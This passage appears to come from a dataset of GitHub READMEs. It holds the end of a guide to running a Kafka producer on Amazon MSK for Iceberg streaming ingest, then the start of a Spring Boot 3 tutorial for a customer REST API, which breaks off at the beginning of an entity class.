--add-opens=java.base/java.lang=ALL-UNNAMED
--add-opens=java.base/java.lang.invoke=ALL-UNNAMED
--add-opens=java.base/java.lang.reflect=ALL-UNNAMED
--add-opens=java.base/java.io=ALL-UNNAMED
--add-opens=java.base/java.net=ALL-UNNAMED
--add-opens=java.base/java.nio=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent.atomic=ALL-UNNAMED
--add-opens=java.base/sun.nio.ch=ALL-UNNAMED
--add-opens=java.base/sun.nio.cs=ALL-UNNAMED
--add-opens=java.base/sun.security.action=ALL-UNNAMED
--add-opens=java.base/sun.util.calendar=ALL-UNNAMED
--add-opens=java.security.jgss/sun.security.krb5=ALL-UNNAMED
```

### Running the Kafka producer on AWS

Create a Amazon MSK cluster with at leas two brokers using ```3.5.1```, [Apache Zookeeper](https://zookeeper.apache.org/) mode version and use as instance type ```kafka.m7g.xlarge```. Do not use public access and choose two private subnets to deploy it. For the security group remember that the EMR cluster and the EC2 based producer will need to reach the cluster and act accordingly. For security, use ```PLAINTEXT``` (in production you should secure access to the cluster). Choose ```200GB``` as storage size for each broker and do not enable ```Tiered storage```. For the cluster configuration use this one:

```
auto.create.topics.enable=true
default.replication.factor=3
min.insync.replicas=2
num.io.threads=8
num.network.threads=5
num.partitions=32
num.replica.fetchers=2
replica.lag.time.max.ms=30000
socket.receive.buffer.bytes=102400
socket.request.max.bytes=104857600
socket.send.buffer.bytes=102400
unclean.leader.election.enable=true
zookeeper.session.timeout.ms=18000
compression.type=zstd
log.retention.hours=2
log.retention.bytes=10073741824
```

Running the Kafka producer on an Amazon EC2 instance, remember to change the bootstrap connection string.

You will need to install Java if you are using and Amazon Linux instance. 
```
sudo yum install java-17-amazon-corretto-devel
```
Then, download the jar to the instance and execute the producer. With the following command you can start the Protocol Buffers Producer.
```
aws s3 cp s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar .
java -cp streaming-iceberg-ingest-1.0-SNAPSHOT.jar com.aws.emr.proto.kafka.producer.ProtoProducer kafkaBoostrapString
```

Remember that your EC2 instance need to have network access to the MSK cluster, you will need to configure the VPC, Security Groups and Subnet/s. 

## Costs

Remember that this example is for high throughput scenarios and therefore the config may lead to quite big bill if deployed on top of AWS, remember to stop the EMR Serverless application, the used instance for the Kafka producer and delete the Amazon MSK cluster when not in use.

## Security

The code here is not secured in any way, you should secure your Apache Kafka cluster and be aware that some dependencies may have known vulnerabilities. If you deploy any service on top of AWS you should configure the roles using the least permission model
using [IAM roles](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) and [Amazon Lake Formation](https://aws.amazon.com/lake-formation/) if needed. 

## Contributing

See [CONTRIBUTING](CONTRIBUTING.md) for more information.

## License

This library is licensed under the MIT-0 License. See the LICENSE file.
",1,1,3,0.0,"['stream', 'apache', 'iceberg', 'examples', 'use', 'apache', 'spark', 'a', 'note', 'performance', 'iot', 'scenario', 'protocol', 'buffer', 'apache', 'avro', 'json', 'cdc', 'scenario', 'requirement', 'run', 'emr', 'serverless', 'run', 'local', 'environment', 'run', 'kafka', 'producer', 'aws', 'cost', 'security', 'contribute', 'license']","['apache', 'run', 'scenario', 'stream', 'iceberg']",1.0,"[com.github.os72:protoc-jar-maven-plugin,org.apache.avro:avro-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-help-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
pmoustopoulos/customer-api,main,"# Spring Boot 3 Knowledge Sharing

This document is designed to help new Spring Boot developers understand the basics of building applications using Spring
Boot 3. It covers the structure of a sample project [Customer API](https://github.com/pmoustopoulos/customer-api),
explains the purpose of key annotations, and provides insights
into best practices. **Note**: You have also to check the code example and not only this markdown file because some
parts
are not shown here (custom annotations, Utils class etc).

**Disclaimer**: This guide reflects my personal opinion and approach, based on the knowledge I have gained through my
work as a developer and my studies. It is not necessarily the best or only way to do things, and as time passes,
practices and tools may evolve. I encourage you to explore other perspectives and approaches as well.

**Feedback and Contributions**: I am always open to feedback and contributions. If you have suggestions for improvement
or additional insights, please feel free to share. Together, we can make this a valuable resource for anyone learning
Spring Boot 3.

## Table of Contents

1. [Introduction](#1-introduction)
2. [Project Structure Overview](#2-project-structure-overview)
3. [Introduction to Maven and `pom.xml`](#3-introduction-to-maven-and-pomxml)
4. [Key Annotations in Spring Boot](#4-key-annotations-in-spring-boot)
5. [Dependency Injection in Spring Boot](#5-dependency-injection-in-spring-boot)
6. [Design Patterns: RESTful API vs. MVC](#6-design-patterns-restful-api-vs-mvc)
7. [Naming Conventions](#7-naming-conventions)
8. [Configuring `application.yaml`](#8-configuring-applicationyaml)
9. [Detailed Package Breakdown](#9-detailed-package-breakdown)
   - [Entity Layer](#entity-layer)
   - [Repository Layer](#repository-layer)
   - [Service Layer](#service-layer)
   - [DTOs and MapStruct](#dtos-and-mapstruct)
   - [Controller Layer](#controller-layer)
   - [Exception Handling](#exception-handling)
10. [Helper Classes](#10-helper-classes)
11. [Testing](#11-testing)
12. [Best Practices](#12-best-practices)
13. [Enhanced Pagination Example](#13-enhanced-pagination-example)
14. [Appendix: Using
    `openapi-generator-maven-plugin` for API Client Generation](#14-appendix-using-openapi-generator-maven-plugin-for-api-client-generation)
15. [Feedback and Contributions](#15-feedback-and-contributions)

## 1. Introduction

### What is Spring Boot?

Spring Boot is an extension of the Spring framework that simplifies the development of Java applications. It provides
tools and conventions that allow developers to get started quickly without needing to manually configure and set up
complex frameworks.

### Why Use Spring Boot?

- **Auto-configuration**: Automatically configures your application based on the dependencies you add to your project.
- **Embedded Server**: You donâ€™t need to set up an external server like Tomcat; Spring Boot applications can run with
  an embedded server.
- **Production-Ready**: Includes features like health checks, metrics, and externalized configuration, making it easy
  to deploy applications in a production environment.

---

## 2. Project Structure Overview

Understanding the structure of a Spring Boot project is crucial for effective development. Below is the typical
structure
of a sample Spring Boot 3 project. Please note this is something I follow based on the knowledge I gained from other
developers.
Furthermore, some packages can be skipped in case based on your use case you do not need them.

```
â”œâ”€â”€ config
â”œâ”€â”€ controller
â”œâ”€â”€ dto
â”œâ”€â”€ entity
â”œâ”€â”€ enums
â”œâ”€â”€ exception
â”œâ”€â”€ filter
â”œâ”€â”€ mapper
â”œâ”€â”€ repository
â”œâ”€â”€ service
â”‚   â””â”€â”€ impl
â””â”€â”€ utils
```

### Packages and Their Purpose

- **`config`**: Contains configuration classes for application-wide settings (e.g., security, open api).
- **`controller`**: REST controllers handling HTTP requests, routing them to services (**note**: do not add logic here).
- **`dto`**: Data Transfer Objects (DTOs) used for transferring data between client and server.
- **`entity`**: JPA entities that represent database tables.
- **`enums`**: Enumerations used across the application.
- **`exception`**: Custom exceptions and a global exception handler.
- **`filter`**: Request filtering and logging logic.
- **`mapper`**: Classes that map entities to DTOs and vice versa. In this case I will use MapStruct for compile-time
  mapping.
- **`repository`**: Data access layer using Spring Data JPA repositories.
- **`service`**: Business logic layer, including interfaces and their implementations.
- **`utils`**: Utility classes and helpers used across the application.

---

## 3. Introduction to Maven and `pom.xml`

### What is Maven?

Maven is a powerful build automation and project management tool that is widely used in Java projects. It helps manage
project builds, dependencies, and configurations in a standardized way. Maven centralizes the projectâ€™s setup in a file
called the **Project Object Model (POM)**, which is typically located in the `pom.xml` file at the root of your project.

### What is a POM?

The **Project Object Model (POM)** is the core of a Maven project. Itâ€™s an XML file that defines the structure,
dependencies, and build configuration of your project. When Maven runs, it reads the `pom.xml` file to determine how to
build, test, and package your application.

### Key Concepts in the POM

#### Project Coordinates:

- **`groupId`**: Identifies your projectâ€™s group, typically following the reverse domain name pattern of your company or
  organization. For example, if your companyâ€™s domain is `ainigma100.com`, your `groupId` might be `com.ainigma100`.
  This convention helps to ensure uniqueness across all projects globally by using a domain that the organization owns
  or controls.
- **`artifactId`**: The name of your project or module (e.g., `customer-api`). It represents the artifact, which is
  usually the output of the project, such as a JAR file.
- **`version`**: The current version of your project (e.g., `0.0.1-SNAPSHOT`). It indicates the specific iteration of
  the project, helping in managing releases and dependencies.

#### Dependencies:

Dependencies define the external libraries your project needs to function. These are specified in the `<dependencies>`
section of the `pom.xml` and are automatically downloaded and included by Maven.

#### Plugins:

Plugins extend the functionality of Maven and are used to perform various build-related tasks, such as compiling code,
running tests, and packaging the application. They are specified in the `<build>` section of the `pom.xml`.

### Example `pom.xml` file for Customer API

<details>
  <summary>View pom file</summary>

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>

    <groupId>com.ainigma100</groupId>
    <artifactId>customer-api</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>customer-api</name>
    <description>customer-api</description>

    <properties>
        <java.version>21</java.version>
        <maven.compiler.source>21</maven.compiler.source>
        <maven.compiler.target>21</maven.compiler.target>
        <springdoc-openapi-starter-webmvc-ui.version>2.6.0</springdoc-openapi-starter-webmvc-ui.version>
        <org.mapstruct.version>1.6.2</org.mapstruct.version>
        <lombok-mapstruct-binding.version>0.2.0</lombok-mapstruct-binding.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>
        <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <optional>true</optional>
        </dependency>
        <dependency>
            <groupId>org.mapstruct</groupId>
            <artifactId>mapstruct</artifactId>
            <version>${org.mapstruct.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springdoc</groupId>
            <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
            <version>${springdoc-openapi-starter-webmvc-ui.version}</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>${maven-compiler-plugin.version}</version>
                <configuration>
                    <source>${maven.compiler.source}</source>
                    <target>${maven.compiler.target}</target>
                    <annotationProcessorPaths>
                        <path>
                            <groupId>org.mapstruct</groupId>
                            <artifactId>mapstruct-processor</artifactId>
                            <version>${org.mapstruct.version}</version>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok-mapstruct-binding</artifactId>
                            <version>${lombok-mapstruct-binding.version}</version>
                        </path>
                    </annotationProcessorPaths>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```

</details>

### Dependencies Included

This `pom.xml` includes several important dependencies:

- **Spring Boot Starter Web**: Provides the necessary components to build a web application, including an embedded
  Tomcat server.
- **Spring Boot Starter Data JPA**: Simplifies database interactions by integrating Spring Data JPA for database
  operations.
- **Spring Boot Starter Actuator**: Adds production-ready features such as monitoring and metrics.
- **Spring Boot Starter Validation**: Facilitates data validation using Hibernate Validator. It allows you to use some
  annotations to validate an object.
- **H2 Database**: A lightweight in-memory database often used for testing and development.
- **Lombok**: Reduces boilerplate code by generating getters, setters, constructors, and other methods at compile time.
- **MapStruct**: A code generator that simplifies the mapping between Java beans.
- **SpringDoc OpenAPI**: Integrates Swagger/OpenAPI support into Spring Boot applications for API documentation.
- **Spring Boot Starter Test**: Provides testing libraries like JUnit, Mockito, and Spring TestContext Framework for
  unit and integration testing.

### Adding More Dependencies

As your project evolves, you might need additional libraries or tools. You can add more dependencies by searching for
them in the [Maven Central Repository](https://mvnrepository.com/) and including them in the `<dependencies>`
section of your `pom.xml`.

### Explanation of Plugin Configuration

In the `<build>` section of the `pom.xml`, we configure the Maven Compiler Plugin with additional settings for Lombok
and MapStruct:

- **Lombok**: Since Lombok generates code during the compilation phase (e.g., constructors, getters, setters), it
  requires an annotation processor. The plugin configuration ensures that Lombok's annotation processor is included,
  allowing Lombok to function correctly during compilation.


- **MapStruct**: MapStruct is a code generator that automatically creates mappers for converting between different
  Java beans. Like Lombok, MapStruct requires an annotation processor to generate the necessary code during compilation.
  The plugin configuration includes the MapStruct processor, ensuring that the mappings are generated correctly.


- **Lombok-MapStruct Binding**: MapStruct and Lombok both operate during the annotation processing phase, but they
  sometimes need to coordinate to avoid conflicts. The `lombok-mapstruct-binding` dependency ensures that Lombok's
  generated code is compatible with MapStruct, allowing both tools to work together seamlessly. This binding is
  configured in the `annotationProcessorPaths` section of the Maven Compiler Plugin, ensuring that the processors
  are run in the correct order.

By configuring these plugins, we ensure that Lombok, MapStruct, and their integration work seamlessly during the build
process, reducing manual coding effort and improving efficiency.

---

## 4. Key Annotations in Spring Boot

In this section, weâ€™ll walk through the key annotations used across the various classes in the example project,
explaining their purpose and best practices. These annotations are essential for managing dependencies, handling HTTP
requests, mapping database entities, and more. Note that we will cover annotations specific to Spring Boot separately
from those provided by Lombok.

### 1. Spring Boot Annotations

These annotations are core to Spring Boot and are used throughout the application to define its structure and behavior.

#### 1.1 Dependency Injection and Component Scanning

- **`@Autowired`**: This annotation is used for automatic dependency injection. It can be applied to constructors,
  methods, fields, and even parameters to inject dependencies wherever they are needed, not just in service classes.
  When used on a constructor, it can be omitted if the class has only one constructor.

- **`@Component`**, **`@Service`**, **`@Repository`**, **`@RestController`**: These annotations are specializations of
  `@Component` and are used to define Spring beans. They indicate that a class is a Spring-managed component and can be
  automatically detected during component scanning. `@RestController` is a specialization of `@Controller` used for
  handling web requests and returning data directly as a response (usually JSON), combining the behavior of
  `@Controller` and `@ResponseBody`.

#### 1.2 Entity Class Annotations

- **`@Entity`**: Marks the class as a JPA entity, meaning it is mapped to a database table.
- **`@Table(name = ""customers"")`**: Specifies the table name in the database that this entity maps to.
- **`@Id`**: Denotes the primary key of the entity.
- **`@GeneratedValue(strategy = GenerationType.IDENTITY)`**: Specifies the primary key generation strategy.
- **`@Column`**: Marks a field as a column in the database. It can include attributes like `nullable`, `unique`, and
  `length`.
- **`@CreationTimestamp`** and **`@UpdateTimestamp`**: Automatically manage the creation and update timestamps of the
  entity.

#### 1.3 Controller Class Annotations

- **`@RestController`**: Combines `@Controller` and `@ResponseBody`, used to handle HTTP requests and return responses
  directly, usually as JSON. It is the preferred annotation for RESTful web services.

- **`@RequestMapping(""/api/v1/customers"")`**: Maps HTTP requests to specific methods in the controller, providing a base
  path for all endpoints within the controller.

- **`@GetMapping`, `@PostMapping`, `@PutMapping`, `@DeleteMapping`**: These annotations map HTTP GET, POST, PUT, and
  DELETE requests to specific methods in the controller, respectively.

- **`@Valid`**: Used to trigger validation of the request body or path variables based on constraints defined in the
  DTO.

- **`@RequestBody`**: Maps the HTTP request body to a Java object, commonly used in POST and PUT methods.

- **`@PathVariable`**: Binds a method parameter to a URI template variable, allowing extraction of values from the URL.

- **`@RequestParam`**: Binds a method parameter to a query parameter in the URL, useful for passing optional or required
  parameters to an endpoint.

#### 1.4 Configuration and Bean Management

- **`@Configuration`**: Indicates that the class contains Spring bean definitions and configuration settings.
- **`@Bean`**: Marks a method as a bean producer in Springâ€™s application context. This methodâ€™s return value is
  registered as a Spring bean.
- **`@Value`**: This annotation is used to pull configuration values from your properties file and inject them directly
  into your code.

#### 1.5. Event Handling

- **`@EventListener`**: This annotation is used to mark a method as an event listener, which listens for specific events
  within the Spring application lifecycle. For example, `@EventListener(ApplicationReadyEvent.class)` triggers when the
  application is ready to service requests.

### 2. Lombok Annotations

Lombok is a Java library that helps reduce boilerplate code by automatically generating common code like constructors,
getters, setters, etc. It is not part of Spring Boot but is often used alongside it for convenience.

- **`@Slf4j`**: Creates a `Logger` instance in the class, allowing for easy logging without manually defining a logger.

- **`@AllArgsConstructor`, `@NoArgsConstructor`, and `@RequiredArgsConstructor`**:
    - **`@AllArgsConstructor`**: Generates a constructor with parameters for all fields in the class.
    - **`@NoArgsConstructor`**: Generates a no-argument constructor.
    - **`@RequiredArgsConstructor`**: Generates a constructor for all final fields and any fields marked as `@NonNull`.

- **`@Data`**: Generates getters, setters, `equals()`, `hashCode()`, `toString()`, and other utility methods. While it
  is suitable for DTOs and simple data carrier classes, it is generally not recommended for JPA entities due to
  potential performance issues and complications with `equals()` and `hashCode()` methods.

- **`@Builder`**: Implements the builder pattern, making it easy to create immutable objects with only the required
  fields set.

### Additional Notes

There are many more annotations in Spring Boot that you might encounter as your application grows or as you write
tests (unit tests, integration tests, etc.). Each layer of the application (controller, service, repository, etc.) and
each use case (security, data validation, testing) has specific annotations that help to streamline development and
improve code quality. This section covers the key annotations used in this project, providing a solid foundation for
understanding how they work together in a Spring Boot application.

---

## 5. Dependency Injection in Spring Boot

Dependency Injection (DI) is a core concept in Spring that allows your classes to be loosely coupled. This means that
instead of your classes creating their dependencies, Spring will provide the dependencies they need. This makes your
code easier to manage, test, and maintain.

### Why Use Dependency Injection?

- **Simplifies Code**: You donâ€™t need to create objects manually.
- **Easier Testing**: You can easily swap out dependencies with mock objects during testing.
- **Loose Coupling**: Your classes depend on abstractions (interfaces) rather than concrete implementations.

### Constructor Injection

Constructor injection is the preferred way to inject dependencies in Spring Boot. This means that you pass the
dependencies into a class through its constructor. This makes your classes more straightforward and ensures all
necessary dependencies are available when the object is created.

Hereâ€™s how it looks:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Constructor Injection
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

In the example above, CustomerService depends on CustomerRepository. Spring automatically provides CustomerRepository
when creating a CustomerService instance.

### Using Lombok to Simplify Constructor Injection

In this project, I am using Lombok annotations to reduce boilerplate code. With Lombok, you can avoid writing
constructors manually by using the @RequiredArgsConstructor annotation. This automatically creates a constructor for all
final fields and autowires the dependencies.

```java

@Service
@RequiredArgsConstructor
public class CustomerService {

    private final CustomerRepository customerRepository;

    // Lombok automatically creates the constructor for you!
}
```

### The @Autowired Annotation

The `@Autowired` annotation tells Spring to automatically inject the required dependencies. In constructor injection, if
you have only one constructor, Spring will automatically inject dependencies without needing @Autowired.

#### Without using Lombok annotation

If you are not using Lombok, you can still use constructor injection like this:

```java

@Service
public class CustomerService {

    private final CustomerRepository customerRepository;

    @Autowired  // Optional with a single constructor
    public CustomerService(CustomerRepository customerRepository) {
        this.customerRepository = customerRepository;
    }
}
```

### Why Constructor Injection is Better

- **Clearer Dependencies**: Itâ€™s obvious which dependencies your class needs.
- **Immutable Fields**: Dependencies can be marked as `final`, ensuring they arenâ€™t changed after theyâ€™re set.
- **Easier to Test**: You can easily provide mock dependencies when testing.

**Note:** Please search online for more details and try to understand this topic because it is important.

---

## 6. Design Patterns: RESTful API vs. MVC

When building applications with Spring Boot, it's essential to understand the different design patterns that can be used
to structure your application. The two most common patterns are **RESTful API** and **Model-View-Controller (MVC)**.
Each serves a different purpose and is chosen based on the needs of the application.

### 1. RESTful API (Service-Oriented Architecture)

- **Pattern Name:** **RESTful API** or **Service-Oriented Architecture (SOA)**
- **Annotation:** `@RestController`
- **Purpose:** The RESTful API pattern is designed to expose data and services over HTTP. In this architecture, the
  server does not concern itself with the presentation layer (UI). Instead, it focuses on delivering data, usually in
  JSON or XML format, which is consumed by a client (like a frontend framework such as Angular, React, or Vue.js).
- **Use Case:** This approach is ideal for applications where the frontend is developed separately from the backend. It
  allows for flexibility, as the frontend can be updated independently of the backend, and the same backend can serve
  multiple clients (web, mobile, etc.).

### 2. Model-View-Controller (MVC)

- **Pattern Name:** **Model-View-Controller (MVC)**
- **Annotation:** `@Controller`
- **Purpose:** The MVC pattern is a traditional approach where the server is responsible for both processing data and
  rendering the user interface. The `@Controller` annotation is used to handle HTTP requests and return views (typically
  HTML) that are rendered on the server side using templating engines like Thymeleaf.
- **Use Case:** MVC is suitable for monolithic applications where the server-side code manages both the business logic
  and the presentation logic. Itâ€™s often used in applications where the frontend is tightly coupled with the backend,
  and there's less need for a separate API layer.

### Differences Between RESTful API and MVC

- **Separation of Concerns:**
    - **RESTful API:** Decouples the backend from the frontend. The server provides data, while the client handles the
      presentation.
    - **MVC:** The server manages both data processing and presentation, offering a tightly integrated solution.

- **Flexibility:**
    - **RESTful API:** Offers greater flexibility as the backend can serve multiple types of clients, and the frontend
      can be updated independently.
    - **MVC:** Less flexible because the frontend and backend are tightly coupled, making it harder to update one
      without impacting the other.

- **Scalability:**
    - **RESTful API:** Easier to scale horizontally as the server's responsibilities are limited to providing data.
    - **MVC:** Can be more challenging to scale because the server handles both the data and the presentation logic.

- **Development Speed:**
    - **RESTful API:** Faster for teams working on large applications with separate frontend and backend teams.
    - **MVC:** Faster for small to medium-sized projects where one team handles both frontend and backend, and where
      integrating the two layers is straightforward.

### Choosing the Right Pattern

The choice between RESTful API and MVC depends on your project requirements:

- **Use RESTful API** if:
    - Your frontend is built with modern JavaScript frameworks.
    - You need to serve multiple types of clients.
    - You prefer a decoupled architecture that allows for more flexibility and easier maintenance.

- **Use MVC** if:
    - Your application is relatively simple, and the frontend is tightly coupled with the backend.
    - You want to leverage server-side rendering for better SEO or faster initial page loads.
    - Youâ€™re building a monolithic application where integrating UI and backend logic is straightforward and beneficial.

---

## 7. Naming Conventions

Consistent naming conventions in your codebase and API design make your project easier to navigate, maintain, and scale.
Below are some guidelines for naming conventions in a Spring Boot project focused on a customer-related API.

### Package Naming

- **Lowercase and Singular**: Package names should be in lowercase and singular. This enhances readability and
  consistency.
    - **Example**: `com.example.customerapi.controller`, `com.example.customerapi.service`
- **No Special Characters**: Avoid using special characters or underscores in package names. Stick to simple,
  descriptive names.
    - **Example**: `com.example.customerapi.repository` (not `com.example_customerapi.repository`)

### Class Naming

- **PascalCase**: Class names should follow PascalCase, where each word starts with an uppercase letter. This is a
  widely accepted convention in Java.
    - **Example**: `CustomerService`, `CustomerController`, `CustomerRepository`
- **Meaningful Names**: Choose descriptive names that clearly indicate the purpose of the class.
    - **Example**: `CustomerNotificationService` instead of `NotificationHelper`

### Entity Naming

- **Singular Form**: Entity classes should be named in the singular form to represent a single instance of the entity.
    - **Example**: `Customer`, `Address`, `Order`
- **Mapped to Plural Table Names**: Entities often map to plural table names in the database.
    - **Example**: `Customer` class maps to `customers` table, `Order` class maps to `orders` table

### API Endpoint Naming

- **Plural Nouns**: Use plural nouns for API endpoints to represent collections of resources.
    - **Example**: `/customers`, `/orders`, `/addresses`


- **Lowercase with Hyphens**: Endpoint paths should be lowercase, with hyphens separating words for readability.
    - **Example**: `/customers/{customerId}/orders`, `/orders/{orderId}/items`, `/customers/{customerId}/addresses`


- **Avoid Verbs in URIs**: Use nouns to represent resources. The HTTP method (GET, POST, PUT, DELETE) should define the
  action, not the URI.
    - **Bad Examples**: `/getCustomers`, `/createOrder`, `/deleteCustomer`
    - **Good Examples**: `/customers` (GET), `/orders` (POST), `/customers/{id}` (DELETE)


- **Use Forward Slashes (/) for Hierarchy**: Forward slashes are used to indicate a hierarchical relationship between
  resources.
    - **Example**: `/customers/{customerId}/orders`, `/customers/{customerId}/addresses`


- **Do Not Use Trailing Slashes**: Avoid trailing slashes at the end of the URI.
    - **Bad Example**: `/customers/`
    - **Good Example**: `/customers`


- **Use Query Parameters for Filtering**: When filtering collections, use query parameters instead of creating new
  endpoints.
  In some cases you may see filtering and sorting information provided as a payload inside a request body.
    - **Example**: `/customers?status=active`, `/orders?customerId=123&status=pending`

---

## 8. Configuring `application.yaml`

The `application.yaml` file is an essential configuration file in a Spring Boot project. It allows you to manage your
application's settings in a clear and structured manner. YAML is preferred over properties files in many cases because
it is easier to read and supports hierarchical data.

### Why `application.yaml`?

When you create a new Spring Boot project, the default configuration file is named `application.properties`. However,
many developers choose to use `application.yaml` instead, as it offers a more concise and readable format, especially
when dealing with complex configurations.

### General Configuration

The main `application.yaml` file typically includes common settings that apply to all environments, such as server
configuration, application name, and basic Spring settings.

### Environment-Specific Configuration

In addition to the main `application.yaml` file, you can create environment-specific YAML files, such as
`application-dev.yaml` for development, `application-uat.yaml` for user acceptance testing, and `application-prod.yaml`
for production. These files contains settings specific to each environment, allowing you to easily switch between
configurations without changing your code.

### Activating Profiles

You can activate a specific profile in several ways:

- **In `application.yaml`**: You can specify the active profile directly in the `application.yaml` file using the
  `spring.profiles.active` property. This is useful for setting a default profile that will be used unless another is
  specified at runtime.
- **At Runtime**: You can also activate a profile at runtime by passing the `spring.profiles.active` property as a
  command-line argument or setting it as an environment variable.

### Best Practices

- **Keep It Simple**: Store common settings in the main `application.yaml` and use environment-specific files for
  configuration differences.
- **Use Profiles**: Profiles help manage different environments like development, testing, and production by allowing
  you to specify environment-specific configurations.
- **YAML Advantages**: The YAML format is preferred for its readability and ability to handle complex, hierarchical
  settings more gracefully than traditional properties files.

### Example `application.yaml` and `application-dev.yaml` files for Customer API

In this section, I provide two YAML configuration files to demonstrate some of the settings I use for a Spring Boot
project. These are just examples, and many other configurations are available depending on your project's needs. As I
continue to develop this project, I may add more configurations.

#### application.yaml

This file contains general settings that apply to all environments. Hereâ€™s a breakdown of the configurations used:

- **`server.port`**: Specifies the port on which the application will run. In this case, itâ€™s set to `8088`. If you do
  not specify the port, the app will start on a `default port` which is `8080`.
- **`server.servlet.context-path`**: Defines the base URL path for the application. Here, itâ€™s dynamically set to the
  artifact ID of the project.
- **`server.shutdown.graceful`**: Enables graceful shutdown, ensuring that the application completes ongoing requests
  before shutting down.
- **`spring.profiles.active`**: Indicates the active profile to be used. In this case, the development profile (`dev`)
  is active.
- **`spring.application.name`**: Sets the application name, dynamically pulled from the project configuration.
- **`spring.lifecycle.timeout-per-shutdown-phase`**: Configures the timeout for each shutdown phase, here set to
  `25 seconds`.
- **`spring.output.ansi.enabled`**: Controls ANSI output in the console, set to `always` to ensure colored output.
- **`springdoc.swagger-ui.path`**: Sets the path for accessing the Swagger UI, useful for API documentation.
- **`springdoc.title`** and **`springdoc.version`**: Define the title and version of the API documentation, again
  dynamically set based on project properties.
- **`openapi.output.file`**: Specify the file name of the swagger file that will be generated by `OpenApiConfig` class
  on start-up. It will be the documentation of the application.

```yaml
server:
  port: 8088
  servlet:
    context-path: '/@project.name@'
  shutdown: graceful

spring:
  profiles:
    active: dev # Specify the active profile

  application:
    name: '@project.name@'
  lifecycle:
    timeout-per-shutdown-phase: 25s

  output:
    ansi:
      enabled: always

springdoc:
  swagger-ui:
    path: /ui
  title: 'Customer API'
  version: '@springdoc-openapi-starter-webmvc-ui.version@'

openapi:
  output:
    file: 'openapi-@project.name@.json'
```

#### application-dev.yaml

This file contains settings specific to the development environment. Here's what each setting does:

- **`datasource.url`**: Configures the JDBC URL for the H2 database. In this example, the database is stored in a local
  file (`./data/customer-db`) with `AUTO_SERVER=true` to allow remote connections.
- **`datasource.username` and `datasource.password`**: Set the database username and password. The default username (
  `sa`) is used with no password.
- **`datasource.driver-class-name`**: Specifies the JDBC driver class for the H2 database.
- **`jpa.show-sql`**: Enables logging of SQL statements generated by Hibernate.
- **`jpa.properties.hibernate.format_sql`**: Formats SQL output to be more readable.
- **`jpa.properties.hibernate.dialect`**: Specifies the Hibernate dialect to use, which is set to `H2Dialect` for
  compatibility with the H2 database.
- **`jpa.generate-ddl`**: Automatically generates database schema (DDL) from JPA entities.
- **`jpa.hibernate.ddl-auto`**: Controls the behavior of schema generation at runtime, with `update` allowing for
  incremental updates to the schema.

### Notes:

- These configurations are just examples based on what I use in this project. There are many other configurations you
  can apply depending on your project's needs.
- As the project evolves, I may add more configurations to enhance functionality or address specific needs.
- Feel free to explore additional configurations and adjust these examples to fit your project requirements.

**Feedback and Contributions**: If you have suggestions or improvements, please share them. Collaboration is key to
refining this guide and making it a valuable resource for all developers.

```yaml
datasource:
  url: jdbc:h2:file:./data/notification-manager-db;AUTO_SERVER=true
  username: sa
  password:
  driver-class-name: org.h2.Driver
jpa:
  show-sql: true
  properties:
    hibernate:
      format_sql: true
      dialect: org.hibernate.dialect.H2Dialect
  generate-ddl: true
  hibernate:
    ddl-auto: update
```

---

## 9. Detailed Package Breakdown

### Entity Layer

- **Purpose**: The entity layer represents the database tables in the form of JPA entities. Each entity class typically
  maps to a single table in the database.

- **Package**: `entity`

- **Example Classes**:
    - `Customer.java`: Represents the `customers` table.

- **Key Annotations**:
    - `@Entity`: Marks a class as a JPA entity.
    - `@Table(name = ""table_name"")`: Specifies the name of the table in the database.
    - `@Id`: Indicates the primary key of the entity.
    - `@GeneratedValue(strategy = GenerationType.IDENTITY)`: Defines the strategy for primary key generation.

<details>
  <summary>View Customer code</summary>

```java
package com.ainigma100.customerapi.entity;

import jakarta.persistence.*;
import lombok.*;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;
